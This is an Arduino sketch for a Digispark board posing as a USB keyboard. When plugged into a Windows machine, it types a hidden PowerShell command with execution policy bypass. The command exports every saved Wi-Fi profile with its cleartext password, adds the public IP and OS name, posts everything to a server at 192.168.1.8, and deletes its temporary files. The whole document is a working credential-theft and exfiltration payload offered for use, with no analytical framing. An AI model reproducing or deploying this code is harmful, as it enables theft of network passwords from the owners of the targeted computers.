#include "DigiKeyboard.h"

#define KEY_R 0x15

void setup() {
  pinMode(1, OUTPUT); // onboard LED
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  // Hidden PowerShell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(800);
  DigiKeyboard.print("powershell -NoP -Ex Bypass");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);

  // Stealth WiFi grab + cleanup + exit
  DigiKeyboard.print(
    F("$u='http://192.168.1.8/wifi-recv.php';"
      "$t=$env:TEMP;"
      "netsh wlan export profile folder=\"$t\" key=clear;"
      "$w=Get-ChildItem \"$t\\Wi-Fi-*.xml\"|ForEach-Object{"
        "[xml]$x=Get-Content $_.FullName;"
        "$s=$x.WLANProfile.name;"
        "$p=$x.WLANProfile.MSM.Security.sharedKey.keyMaterial;"
        "[pscustomobject]@{"
          "Time=(Get-Date -f 'dd MMM yyyy, hh:mm:ss tt');"
          "SSID=$s;"
          "Pass=if($p){$p}else{''};"
          "IP=(Invoke-WebRequest -UseBasicParsing 'https://api.ipify.org').Content;"
          "OS=(Get-CimInstance Win32_OperatingSystem).Caption"
        "};"
        "Remove-Item $_.FullName -ErrorAction SilentlyContinue"
      "};"
      "$csv=\"$t\\w.csv\";"
      "$w|Export-Csv $csv -NoTypeInformation;"
      "Invoke-WebRequest -UseBasicParsing -Uri $u -Method Post -Body (Get-Content $csv -Raw);"
      "Remove-Item $csv -ErrorAction SilentlyContinue;"
      "exit")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Give PowerShell a moment to finish
  DigiKeyboard.delay(3000);

  // Blink LED forever to indicate completion
  while (true) {
    digitalWrite(1, HIGH);
    DigiKeyboard.delay(150);
    digitalWrite(1, LOW);
    DigiKeyboard.delay(150);
  }
}
